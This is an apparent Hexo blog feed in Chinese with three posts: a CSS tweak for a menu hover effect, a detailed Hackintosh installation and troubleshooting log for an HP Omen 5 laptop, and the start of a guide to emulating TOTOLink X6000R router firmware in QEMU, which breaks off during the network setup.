<h3 id="鼠标移入菜单效果"><a href="#鼠标移入菜单效果" class="headerlink" title="鼠标移入菜单效果"></a>鼠标移入菜单效果</h3><p>原本是鼠标悬浮后标签下出现蓝条，现在改为放大效果，通过添加自定义CSS实现</p>
<ol>
<li><p>在博客根目录source目录下创建好css、js、img文件夹，用来存放自定义的文件，这里我将这些文件夹统一放在&#x2F;source&#x2F;config目录下：</p>
<img src="/posts/a5aaf96c/image-20241027223321828.png" class="" title="image-20241027223321828">
</li>
<li><p>引入自定义的js、css文件<br>直接在主题配置文件中配置即可，这里我的配置文件为_config.butterfly.yml，在文件中找到inject</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># ps：引入自定义css、js</span></span><br><span class="line"><span class="comment">#     css文件在head引入，js文件在bottom里引入，有的js要求在head引入，不然无法生效</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># ps: 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span> <span class="comment">#注入自定义css</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/config/css/style.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="comment">#注入自定义js</span></span><br><span class="line">    <span class="comment">#  - &lt;script src=&quot;/config/js/script.js?v1&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/xxxx&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加自定义css文件</p>
<p>在&#x2F;source&#x2F;config&#x2F;css中新建style.css文件，添加如下内容：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 去除导航栏选项中底下的蓝条 */</span></span><br><span class="line"><span class="selector-id">#nav</span> *<span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 导航栏菜单鼠标移入字体放大 */</span></span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#site-name</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-class">.menus_item</span><span class="selector-pseudo">:hover</span>, </span><br><span class="line"><span class="selector-id">#nav</span> <span class="selector-id">#search-button</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">28px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>可以成功实现效果，不过有点不协调，如果导航栏居中的话可以使用这一效果（类似于mac的dork效果）。</p>
<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/a5aaf96c/image-20241027225811317.png" class="" title="image-20241027225811317">
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>Hexo</tag>
        <tag>建站</tag>
        <tag>美化</tag>
      </tags>
  </entry>
  <entry>
    <title>暗影精灵5安装黑苹果过程记录</title>
    <url>/posts/2c9d5f9e.html</url>
    <content><![CDATA[<p>众所周知，黑苹果系统安装对硬件设备限制很多，之前一直不敢尝试，而最近找到了一个相同型号的黑苹果安装记录，Mac可以支持到Ventura版本，不过其安装过程并没有很详细。因此笔者尝试一下，在此记录下安装的过程。</p>
<p>参考链接：</p>
<ul>
<li><p><a href="https://blog.hibobmaster.com/2020/10/26/hp-15-dc1010nr-hackintosh/">暗影精灵5之OpenCore引导黑苹果</a></p>
</li>
<li><p><a href="https://dortania.github.io/OpenCore-Install-Guide/installer-guide/">OpenCore Install Guide</a></p>
</li>
</ul>
<h4 id="2024-11-01更新"><a href="#2024-11-01更新" class="headerlink" title="2024&#x2F;11&#x2F;01更新"></a>2024&#x2F;11&#x2F;01更新</h4><p>换成了更新的EFI，见链接<a href="https://github.com/Darkspeed294/HP-Omen-15-DC-1xxxx-Hackintosh-Opencore">https://github.com/Darkspeed294/HP-Omen-15-DC-1xxxx-Hackintosh-Opencore</a></p>
<h4 id="2024-11-07更新"><a href="#2024-11-07更新" class="headerlink" title="2024&#x2F;11&#x2F;07更新"></a>2024&#x2F;11&#x2F;07更新</h4><p>成功安装黑苹果，先将过程的一些记录放出来，后面会进行整理</p>
<h2 id="本机配置"><a href="#本机配置" class="headerlink" title="本机配置"></a>本机配置</h2><p><strong>电脑型号</strong>：暗影精灵5</p>
<table>
<thead>
<tr>
<th>CPU</th>
<th>i7-9750H</th>
</tr>
</thead>
<tbody><tr>
<td>iGPU</td>
<td>Intel UHD Graphics 630</td>
</tr>
<tr>
<td>dGPU</td>
<td>GTX1650</td>
</tr>
<tr>
<td>Audio</td>
<td>Realtek ALC295</td>
</tr>
<tr>
<td>Disk</td>
<td>HP SSD EX920 + Netac SSD</td>
</tr>
<tr>
<td>Wireless</td>
<td>Wireless-AC 9560&#x2F;BCM94352z</td>
</tr>
<tr>
<td>Ethernet</td>
<td>Realtek 8111&#x2F;8168&#x2F;8411 PCI Express Gigabit Ethernet</td>
</tr>
</tbody></table>
<h2 id="制作U盘系统安装器"><a href="#制作U盘系统安装器" class="headerlink" title="制作U盘系统安装器"></a>制作U盘系统安装器</h2><p>首先安装几个需要的工具</p>
<ul>
<li><a href="https://github.com/acidanthera/OpenCorePkg/releases">OpenCorePkg</a>：按照官方文档提示是推荐安装debug版本，可以方便后续问题解决；</li>
<li><a href="https://github.com/corpnewt/ProperTree">ProperTree</a>：用于修改后续生成的.plist文件。</li>
</ul>
<p>然后开始制作安装器，有在线安装和离线安装两种方式，离线安装需要在MacOS上运行；而在线安装可以支持任意系统。因此本文选择在线安装方式：</p>
<p>准备几个工具：</p>
<ul>
<li>4GB大小的U盘</li>
<li><a href="https://github.com/acidanthera/OpenCorePkg/releases">macrecovery.py</a>(需要Python3环境)</li>
</ul>
<h3 id="制作USB启动器"><a href="#制作USB启动器" class="headerlink" title="制作USB启动器"></a>制作USB启动器</h3><h4 id="下载macOS"><a href="#下载macOS" class="headerlink" title="下载macOS"></a>下载macOS</h4><p>在下载的OpenCore目录下<code>/Utilities/macrecovery/</code>打开终端。然后运行以下命令（根据你想要下载的MacOS版本挑选一个即可）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Lion (10.7):</span></span><br><span class="line">py macrecovery.py -b Mac-2E6FAB96566FE58C -m 00000000000F25Y00 download</span><br><span class="line">py macrecovery.py -b Mac-C3EC7CD22292981F -m 00000000000F0HM00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mountain Lion (10.8):</span></span><br><span class="line">py macrecovery.py -b Mac-7DF2A3B5E5D671ED -m 00000000000F65100 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mavericks (10.9):</span></span><br><span class="line">py macrecovery.py -b Mac-F60DEB81FF30ACF6 -m 00000000000FNN100 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Yosemite (10.10):</span></span><br><span class="line">py macrecovery.py -b Mac-E43C1C25D4880AD6 -m 00000000000GDVW00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">El Capitan (10.11):</span></span><br><span class="line">py macrecovery.py -b Mac-FFE5EF870D7BA81A -m 00000000000GQRX00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Sierra (10.12):</span></span><br><span class="line">py macrecovery.py -b Mac-77F17D7DA9285301 -m 00000000000J0DX00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">High Sierra (10.13)</span></span><br><span class="line">py macrecovery.py -b Mac-7BA5B2D9E42DDD94 -m 00000000000J80300 download</span><br><span class="line">py macrecovery.py -b Mac-BE088AF8C5EB4FA2 -m 00000000000J80300 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Mojave (10.14)</span></span><br><span class="line">py macrecovery.py -b Mac-7BA5B2DFE22DDD8C -m 00000000000KXPG00 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Catalina (10.15)</span></span><br><span class="line">py macrecovery.py -b Mac-00BE6ED71E35EB86 -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Big Sur (11)</span></span><br><span class="line">py macrecovery.py -b Mac-42FD25EABCABB274 -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Monterey (12)</span></span><br><span class="line">py macrecovery.py -b Mac-FFE5EF870D7BA81A -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ventura (13)</span></span><br><span class="line">py macrecovery.py -b Mac-4B682C642B45593E -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Sonoma (14)</span></span><br><span class="line">py macrecovery.py -b Mac-226CB3C6A851A671 -m 00000000000000000 download</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Latest version</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ie. Sequoia (15)</span></span><br><span class="line">py macrecovery.py -b Mac-937A206F2EE63C01 -m 00000000000000000 download</span><br></pre></td></tr></table></figure>

<p>由于MacOS Monterey版本比较稳定，也在上述博文中已实现的版本列表中，因此本文选择Monterey版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Monterey (12)</span></span><br><span class="line">python3 macrecovery.py -b Mac-FFE5EF870D7BA81A -m 00000000000000000 download</span><br></pre></td></tr></table></figure>





<p><strong>注意：</strong></p>
<ul>
<li><p><strong>对于MacOS 12以上的版本，需要使用USBToolBox对U盘进行处理。（推荐在安装好后再搞，如果安装过程中发现USB错误则再搞这个）</strong></p>
<p>参考链接：<a href="https://tonymacx86.com/threads/how-to-usb-ports-map-for-macos-with-usbtoolbox.324437/">USB ports map for macOS with USBToolBox</a></p>
<p>下载工具<a href="https://github.com/USBToolBox/tool/releases/tag/0.2">USBToolBox</a>，选择Windows.exe安装</p>
<p>安装后终端里运行，选择C修改配置信息如下：</p>


<p>选择D展示所有发现的USB端口设备，绿色表示已连接，其余为白色，可以发现共有24个端口，高于苹果的15个端口的限制，因此应该进行映射来避免问题。</p>


<p>其中很多端口其实电脑都用不到的，因为笔记本一共就三个USB接口，一个Type-C接口。可以用U盘和雷电接口的设备接下每个接口，看实际使用的接口有哪些。</p>
<p>结束后按B返回，然后选择S重排端口，将使用过的端口排在前面。使用<code>c:x:name</code>命令，x代表端口号，名字为你想要设置的名字（不必要，主要是为了清晰）。</p>
<p>可以按N禁用所有映射，按P将所有已知端口映射。最后按K生成kext文件。</p>


<p>最后下载<a href="https://github.com/USBToolBox/kext/releases/tag/1.1.1">USBToolBox.kext</a>文件，两个kext文件夹应同时存在，以备后续使用。</p>
</li>
<li><p><strong>在启动时需要关闭XhciPortLimit选项</strong>，后续会提到</p>
</li>
</ul>
<h4 id="制作U盘系统启动器"><a href="#制作U盘系统启动器" class="headerlink" title="制作U盘系统启动器"></a>制作U盘系统启动器</h4><ul>
<li><p>根据官方文档有两种方式，我们选择第一种Disk Management method</p>
</li>
<li><p>右键Win开始键，选择磁盘管理工具，选择接入的U盘，右键格式化为FAT32格式，此处分区大小需要小于32GB才能够以FAT32格式化，需要注意。另外还需要创建一个EFI分区，同样是FAT32格式化。</p>

</li>
<li><p>然后在U盘根目录下创建<code>com.apple.recovery.boot</code>文件夹，将下载好的BaseSystem文件移入该目录下，注意dmg和chunklist两个文件都需要复制。</p>
</li>
<li><p>然后打开之前下载的<code>OpenCorePkg</code>目录，选择X64文件夹打开，然后将其中EFI文件复制过去，此时你的U盘目录应为：</p>
</li>
</ul>
<h3 id="添加基本的OpenCore文件"><a href="#添加基本的OpenCore文件" class="headerlink" title="添加基本的OpenCore文件"></a>添加基本的OpenCore文件</h3><ul>
<li><p>打开U盘中的EFI文件夹，OC目录中有大量的文件，其中有很多都是我们不需要的，具体可以参考<a href="https://dortania.github.io/OpenCore-Install-Guide/installer-guide/opencore-efi.html">官方文档</a>。这里直接采用默认方法，参考下图：</p>

</li>
<li><p>然后将你需要的各种设备驱动文件填入对应目录下，这里我参考了对应博文的内容，由于版本不一致，还是推荐阅读<a href="https://dortania.github.io/OpenCore-Install-Guide/ktext.html#virtualsmc-plugins">官方文档</a>。</p>
<table>
<thead>
<tr>
<th>驱动</th>
<th>描述信息</th>
<th>安装路径</th>
</tr>
</thead>
<tbody><tr>
<td>HfsPlus.efi</td>
<td>通用驱动，必备</td>
<td>&#x2F;OC&#x2F;Drivers</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><code>kext</code>目录：</p>


<p><code>SSDT</code>这里选择直接复制博文提供的ACPI，感觉没差。</p>
</li>
</ul>
<h3 id="配置config-plist"><a href="#配置config-plist" class="headerlink" title="配置config.plist"></a>配置config.plist</h3><h4 id="新建自定义的config-plist"><a href="#新建自定义的config-plist" class="headerlink" title="新建自定义的config.plist"></a>新建自定义的config.plist</h4><p>首先从&#x2F;OpenCore&#x2F;Docs&#x2F;目录选取Sample.plist，将其复制到U盘&#x2F;OC目录中，并重命名为config.plist</p>
<p>安装工具<a href="https://github.com/corpnewt/ProperTree">ProperTree</a>和<a href="https://github.com/corpnewt/GenSMBIOS">GenSMBIOS</a></p>
<p>按Ctrl+O打开config.plist文件</p>
<p>打开后，按<strong>Ctrl + Shift + R</strong>键令其指向&#x2F;EFI&#x2F;OC创建一个<code>Clean Snapshot</code>，这会将你的配置项全部加载并写入到config.plist中。</p>
<h4 id="选择笔记本平台"><a href="#选择笔记本平台" class="headerlink" title="选择笔记本平台"></a>选择笔记本平台</h4><p>选择了<code>Coffee Lake and Whiskey Lake</code>型号。</p>
<p>根据<a href="https://dortania.github.io/OpenCore-Install-Guide/config-laptop.plist/coffee-lake.html#laptop-coffee-lake-and-whiskey-lake">官方文档</a>进行配置：</p>
<p><strong>2021-9-12</strong>: 请自行按下面的说明修改<code>config.plist</code>（没有发布新的EFI，开学了等有时间把OC升级到0.7.3再补上，目前请手动修改），解决OC引导windows后显示型号为mac*，manufacture为Acidanthera的问题，这样在windows下 <strong>omen game hub</strong> 才能正常的对系统资源进行监控和操作。<br><code>Kernel&gt; Quirks&gt; CustomSMBIOSGuid&gt; True (default is False)</code><br><code>PlatformInfo&gt; UpdateSMBIOSMode&gt; Custom (default is Create)</code></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>痛苦的问题解决模块</p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
<li><p>卡在exit：ACPI没有用最新的。</p>
</li>
<li><p>卡在ioplatformpanicaction -&gt; applesmc</p>
<p><a href="https://bbs.pcbeta.com/viewthread-1887955-1-1.html">参考链接</a></p>
<p>删除OC config.plist的核显device_id</p>
</li>
<li><p>卡在xpc.launchd：</p>
<ol>
<li><p>尝试禁用GPU独显（无果）</p>
</li>
<li><p>也有说是USB没有定制的问题，不过我本身就已经定制好了，而且关不关好像对启动都没啥影响，所以也不是这个问题</p>
</li>
<li><p>有文章说问题不是出在xpc这里，xpc报错不会影响，但是换了好几个EFI都存在这一问题，因此也不行</p>
<ol>
<li><p>注意到开始出现com.xpc.launchd时并没有报错，可能确实无关？这里发现一直运行到了AppleALC这一步，启动过程参考：<a href="https://dortania.github.io/OpenCore-Install-Guide/troubleshooting/boot.html">https://dortania.github.io/OpenCore-Install-Guide/troubleshooting/boot.html</a></p>
<p><a href="https://dortania.github.io/OpenCore-Install-Guide/troubleshooting/extended/kernel-issues.html#stuck-on-or-near-ioconsoleusers-gioscreenlock-giolockstate-3">https://dortania.github.io/OpenCore-Install-Guide/troubleshooting/extended/kernel-issues.html#stuck-on-or-near-ioconsoleusers-gioscreenlock-giolockstate-3</a></p>
<p>根据该问题进行修改。</p>
<ul>
<li>按照这个方法加上参数</li>
</ul>
</li>
</ol>
</li>
<li><p>CSM也已经关闭，BIOS设置无误</p>
</li>
<li><p>尝试仿冒CPU（按理说也不行，因为本人的电脑型号按官方教程是不需要的，不过也尝试看看）</p>
</li>
<li><p>还有一个说可以把蓝牙，WIFI什么的先都去掉，等安装上之后再装，后续也可以试一试。</p>
</li>
<li><p>NVME报错：按教程说是硬盘不兼容，因此不太能进行下去了，等后面配台式再说吧。<br><a href="https://apple.sqlsec.com/6-%E5%AE%9E%E7%94%A8%E5%A7%BF%E5%8A%BF/6-8/">https://apple.sqlsec.com/6-%E5%AE%9E%E7%94%A8%E5%A7%BF%E5%8A%BF/6-8/</a><br><a href="https://www.bilibili.com/video/av210356622/?vd_source=fb139bb297dc8adccc706ce3cb357f3a">https://www.bilibili.com/video/av210356622/?vd_source=fb139bb297dc8adccc706ce3cb357f3a</a><br>没有成功，然后添加启动参数nvme&#x3D;-1成功在跑码后黑屏</p>
</li>
<li><p>跑码后黑屏解决</p>
<p>启动参数添加-igfxblr参数</p>
</li>
<li><p>卡在IOConsoleUsers: gIOScreenLock前</p>
<p><a href="https://quanquan.space/viewtopic.php?t=390">https://quanquan.space/viewtopic.php?t=390</a></p>
<p>添加参数-igfxmlr</p>
</li>
<li><p>卡在苹果logo，没有进度条，或者说进度条是个蓝紫色的框，左上角有鼠标箭头，鼠标动不了。</p>
<ol>
<li>怀疑是没有做USBmap，（做了后也没用</li>
<li>添加device_id参数，成功进入界面，不过后来又进不去了，很玄学</li>
<li>尝试更新其中的AppleALC驱动（无果</li>
<li>因为鼠标动不了，猜测是Voodoo驱动问题，更新驱动Voodoo*（触摸板驱动），也不行</li>
<li>最后发现是系统镜像的问题，换位13版本成功进入</li>
</ol>
</li>
<li><p>recovery安装无法下载。</p>
<ol>
<li>使用Unplugged工具进行离线安装</li>
</ol>
</li>
<li><p>第二次启动卡nvme successfully initialized</p>
<ol>
<li>考虑第二次启动关闭SSD屏蔽，无果</li>
<li>发现可能是通过Unplugged工具安装的Ventura与前面成功启动的Ventura小版本不匹配，导致出现的一些更新特性不能兼容，因此从网上找到同一版本号的镜像进行安装（注意，前面的方法是基于Opencore的恢复式安装，接下来是安装的完整镜像）<br>使用etcher烧写工具重新烧写U盘。</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>解决以上问题后，大功告成！！！</p>
<h2 id="TODO-LIST"><a href="#TODO-LIST" class="headerlink" title="TODO LIST"></a>TODO LIST</h2><ul>
<li><input checked="" disabled="" type="checkbox"> 配置OC主题</li>
<li><input checked="" disabled="" type="checkbox"> Mac基础美化</li>
<li><input checked="" disabled="" type="checkbox"> 常用软件工具安装</li>
<li><input checked="" disabled="" type="checkbox"> <del>OC版本更新</del>（更新后电池保护补丁出错，还是苟在老版本吧）</li>
<li><input checked="" disabled="" type="checkbox"> <del>OC相关驱动更新</del>（更新后电池保护补丁出错，还是苟在老版本吧）</li>
<li><input disabled="" type="checkbox"> OC主题自定义</li>
<li><input disabled="" type="checkbox"> 数据盘共享</li>
<li><input disabled="" type="checkbox"> 触摸板</li>
<li><input checked="" disabled="" type="checkbox"> 键盘按键映射</li>
<li><input disabled="" type="checkbox"> OC引导启动项隐藏</li>
</ul>
]]></content>
      <tags>
        <tag>教程</tag>
        <tag>装机</tag>
      </tags>
  </entry>
  <entry>
    <title>Qemu模拟TOTOLink X6000R固件</title>
    <url>/posts/d96204a2.html</url>
    <content><![CDATA[<p>最近在挖掘固件漏洞，有些路由器没有现成设备，要验证时只能通过qemu模拟的方式来完成。在此记录下QEMU的使用过程</p>
<p>参考文章：<a href="https://www.cnblogs.com/kin-zhang/p/15031633.html">TOTOLINK 路由器漏洞分析+QEMU模拟入门</a></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="QEMU安装"><a href="#QEMU安装" class="headerlink" title="QEMU安装"></a>QEMU安装</h3><p>为安装方便，笔者直接选择使用apt install的方式来安装qemu，想要使用源码编译的话可以参考<a href="https://www.qemu.org/download/#source">官网</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install qemu-system		# qemu系统模拟</span><br><span class="line">sudo apt-get install qemu-user-static	# qemu用户模拟</span><br></pre></td></tr></table></figure>

<h3 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h3><p><strong>固件型号</strong>：TOTOLink X6000R</p>
<p><strong>固件版本</strong>：v9.4.0cu.852_20230719</p>
<p><strong>固件架构</strong>：Aarch64</p>
<p>固件可以直接在<a href="https://download.totolink.tw/uploads/firmware/X6000R/TOTOLINK_X6000R_V9.4.0cu.1041_B20240224.zip">官网</a>下载，使用<code>binwalk</code>工具提取其文件系统。</p>
<h3 id="QEMU-User模拟"><a href="#QEMU-User模拟" class="headerlink" title="QEMU-User模拟"></a>QEMU-User模拟</h3><p>将<code>qemu-aarch64-static</code>程序复制到固件文件系统下，使用chroot设置文件系统为根目录，然后通过qemu-user模拟固件shttpd程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-aarch64-static ./usr/sbin/shttpd</span><br></pre></td></tr></table></figure>

<img src="/posts/d96204a2/image-20241103171214775.png" class="" title="image-20241103171214775">

<p>可以看到成功运行shttpd程序，不过如果要测试命令注入漏洞返回shell还是要使用系统模拟，并且用户模拟程序，我跑shttpd结果是打不开网页的。</p>
<h3 id="QEMU-System模拟"><a href="#QEMU-System模拟" class="headerlink" title="QEMU-System模拟"></a>QEMU-System模拟</h3><p>system模拟方式则更加全面，包括cpu，外设等等。</p>
<p>基本条件：</p>
<ul>
<li>内核镜像</li>
<li>虚拟磁盘镜像</li>
<li>网卡（非必须，不过要测试路由器，还是需要的）</li>
</ul>
<h4 id="下载内核，虚拟磁盘镜像"><a href="#下载内核，虚拟磁盘镜像" class="headerlink" title="下载内核，虚拟磁盘镜像"></a>下载内核，虚拟磁盘镜像</h4><p>Debian官网有提供针对QEMU的各类架构的Linux内核系统、虚拟磁盘镜像下。<a href="https://people.debian.org/~gio/dqib/">下载地址</a></p>
<p>这里我选择<a href="https://gitlab.com/api/v4/projects/giomasce%2Fdqib/jobs/artifacts/master/download?job=convert_arm64-virt">arm64-virt镜像</a>。下载后重命名为zip文件，解压后得到7个文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ tree ./</span><br><span class="line">./</span><br><span class="line">├── image.qcow2</span><br><span class="line">├── initrd</span><br><span class="line">├── kernel</span><br><span class="line">├── readme.txt</span><br><span class="line">├── ssh_user_ecdsa_key</span><br><span class="line">├── ssh_user_ed25519_key</span><br><span class="line">└── ssh_user_rsa_key</span><br><span class="line"></span><br><span class="line">0 directories, 7 files</span><br></pre></td></tr></table></figure>

<p>其中<code>readme.txt</code>给定了qemu启动命令，启动命令，你会发现打印很多日志后，成功获取到shell。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(Try to) boot with:</span></span><br><span class="line">sudo qemu-system-aarch64 \</span><br><span class="line">-machine &#x27;virt&#x27; \</span><br><span class="line">-cpu &#x27;cortex-a57&#x27; \</span><br><span class="line">-m 1G \</span><br><span class="line">-device virtio-blk-device,drive=hd \</span><br><span class="line">-drive file=image.qcow2,if=none,id=hd \</span><br><span class="line">-device virtio-net-device,netdev=net -netdev user,id=net,hostfwd=tcp::2222-:22 \</span><br><span class="line">-kernel kernel \</span><br><span class="line">-initrd initrd \</span><br><span class="line">-nographic \</span><br><span class="line">-append &quot;root=LABEL=rootfs console=ttyAMA0&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">You can use Ctrl-a x to <span class="built_in">exit</span> from QEMU.</span></span><br></pre></td></tr></table></figure>

<p>出现shell后使用root:root登录即可，注意这里我设置了网卡为tap_qemu，因此如果需要宿主机和虚拟机相互连通，需要进行虚拟网卡的设置。</p>
<h4 id="配置虚拟系统网卡"><a href="#配置虚拟系统网卡" class="headerlink" title="配置虚拟系统网卡"></a>配置虚拟系统网卡</h4><p>配置一张可供host，guest通信的虚拟网卡命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 brctl 网桥配置工具</span></span><br><span class="line">sudo apt-get  install bridge-utils</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装 tunctl 虚拟网卡配置工具</span></span><br><span class="line">sudo apt-get install uml-utilities</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加一个网桥 br0</span></span><br><span class="line">sudo brctl addbr br0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置网桥 br0 的网段及掩码，并启用网桥</span></span><br><span class="line">sudo ifconfig br0 192.168.5.1/24 up</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建一张虚拟网卡 tap0</span></span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置虚拟网卡 tap0 的 ip 地址及掩码，并启用该虚拟网卡</span></span><br><span class="line">sudo ifconfig tap0 192.168.5.11/24 up</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将虚拟网卡 tap0 添加到网桥 br0 中</span></span><br><span class="line">sudo brctl addif br0 tap0</span><br></pre></td></tr></table></figure>

<p>创建完毕后ifconfig返回信息如下，发现新增br0和tap0两个网卡，其中br0负责桥接宿主机和客户机，tap0负责宿主机ip：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ifconfig</span><br><span class="line">br0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        ether f2:5f:4f:59:38:2c  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.178.131  netmask 255.255.240.0  broadcast 172.17.191.255</span><br><span class="line">        inet6 fe80::215:5dff:fee8:a09b  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:15:5d:e8:a0:9b  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 130737  bytes 132443978 (132.4 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 66566  bytes 6308721 (6.3 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 447386  bytes 1366419777 (1.3 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 447386  bytes 1366419777 (1.3 GB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">tap0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.11  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        ether 8e:8a:46:56:b0:40  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>

<p>修改以上qemu启动脚本，添加网卡参数：</p>
